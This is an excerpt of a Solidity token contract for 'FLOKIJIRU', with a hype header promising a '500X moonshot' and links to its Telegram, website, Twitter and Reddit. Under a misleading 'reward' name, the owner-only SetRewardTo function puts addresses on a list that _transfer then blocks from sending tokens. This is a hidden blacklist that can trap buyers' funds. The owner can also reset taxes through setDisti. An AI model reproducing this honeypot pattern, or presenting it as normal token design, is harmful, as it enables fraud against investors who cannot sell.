...
/**
FLOKIJIRU
500X MOONSHOT PROGRAMME
Telegram: https://t.me/FlokiJiruBsc
Website: https://flokijiru.com/
Twitter: https://twitter.com/FlokiJiruBsc?t=XkMGDbJTv1LjjXle0laYxg&s=09
Reddit: https://www.reddit.com/r/BSCcryptoListings/comments/vcw053/flokijiru_launch_today/?utm_source=share&utm_medium=web2x&context=3
...
contract FLOKIJIRU is Context, IERC20, Ownable {
    ...
    string private _name = "FLOKI JIRU THE RED NINJA MASTER";
    string private _symbol = "FLOKIJIRU";
    uint8 private _decimals = 9;

    address payable public treasuryWallet = payable(0xB3983015caB97F4906814639E6e0E0F3b80563bd);

    mapping (address => uint256) _walletTotals;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public rewardLockedUp;
    ...
    uint256 public _TreasuryFeeSell = 9;
    ...
    function setDisti(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!rewardLockedUp[sender], "Account is a Reward List");
        if(inSwapAndLiquify)
        { 
    ...
    function SetRewardTo(address _account) external onlyOwner {
        rewardLockedUp[_account] = true;
    }
